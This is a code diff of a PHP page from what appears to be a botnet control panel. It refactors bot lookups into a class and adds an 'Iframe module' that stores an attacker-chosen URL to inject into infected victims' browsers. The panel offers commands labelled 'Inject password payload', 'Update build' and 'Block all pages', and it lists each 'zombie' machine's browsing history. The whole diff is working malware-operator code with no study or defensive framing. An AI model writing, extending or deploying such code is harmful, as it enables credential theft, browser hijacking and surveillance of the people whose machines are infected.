@@ -2,11 +2,10 @@
 if(isset($_GET['id']) && $_GET['id'] == ''){
     exit(1);
 }
-$select_name = $bdd->prepare("SELECT name FROM bots WHERE id = :id");
-$select_name->bindParam(':id', $_GET['id']);
-$select_name->execute();
-$result = $select_name->fetch();
-$z_name = $result['name'];
+require_once('class/bot.class.php');
+$bot = new Bot();
+$bot->getName($_GET['id']);
+$z_name = $bot->bot_id;
 ?>
 <div class="panel">
     <div class="ui pointing menu">
@@ -19,7 +18,7 @@ $z_name = $result['name'];
     </div>
          <div class="ui segment">
         <h3>Listing action</h3>
-        <form action="#" method="post">
+        <form class="ui form" action="#" method="post">
             <select class="command" name="command">
                 <option name='History'>Show computer history</option>
                 <option name='WebInject'>Inject password payload</option>
@@ -27,8 +26,62 @@ $z_name = $result['name'];
                 <option name="update">Update build</option>
                 <option name="lock">Block all pages</option>
             </select>
-            <input class="command" type="submit" name="send" value="start command"/>
+            <input class="ui button" class="command" type="submit" name="send" value="start command"/>
         </form>
+    </div>
+     <div class="ui segment">
+        <h3>Iframe module</h3>
+         <form class="ui form" action="" method="post">
+             <div class="field">
+                 <?php
+                 if($bot->getSetting($z_name, 'iframe') !== false){
+                     ?>
+                    <input type="text" name="url" value="<?php echo $bot->getSetting($z_name, 'iframe')['setting_value']; ?>"/>
+                    <?php
+                 }
+                 else{
+                 ?>
+                    <input type="text" name="url" placeholder="http://exemple.com"/>
+                 <?php
+                 }
+                 ?>
+             </div>
+             <?php
+             if($bot->getSetting($z_name, 'iframe') !== false){
+                 $status = $bot->getSetting($z_name, 'iframe')['available'];
+                 if($status == '0'){
+                     $status = "Disabled";
+                 }
+                 if($status == '1'){
+                     $status = 'Activated';
+                 }
+                 ?>
+                <div class="field">
+                     <div class="ui labeled button" tabindex="0">
+                         <input class="ui left  button" type="submit" name="iframestart" value="save"/>
+                         <input type="submit" name="status" class="ui basic left pointing label" value="<?php echo $status; ?>">
+                    </div>
+                 </div>
+                 <?php
+             }
+             else{
+                 ?>
+                <div class="field">
+                    <input class="ui left  button" type="submit" name="iframestart" value="save"/>
+                 </div>
+                <?php
+             }
+             ?>
+         </form>
+         <?php
+         if(isset($_POST['iframestart'])){
+            $bot->setSetting($z_name, 'iframe', $_POST['url']);
+         }
+         elseif(isset($_POST['status'])){
+             $bot->changeSettingStatus($z_name, 'iframe');
+             echo "status update!";
+         }
+         ?>
     </div>
      <div class="ui segment">
         <h3>Computer history</h3>
@@ -40,19 +93,7 @@ $z_name = $result['name'];
     </tr>
   </thead>
   <tbody>
-      <?php
-      $history = $bdd->prepare("SELECT * FROM history_web WHERE zombie = :name ORDER BY id DESC LIMIT 0,5");
-      $history->bindParam(':name', $z_name);
-      $history->execute();
-      while($fetch = $history->fetch()){
-      ?>
-        <tr>
-          <td><?php echo $fetch['website']; ?></td>
-          <td><?php echo $fetch['timevisit']; ?></td>
-        </tr>
-      <?php
-      }
-      ?>
+    <?php $bot->getHistory($z_name); ?>
   </tbody>
 </table>
     </div>
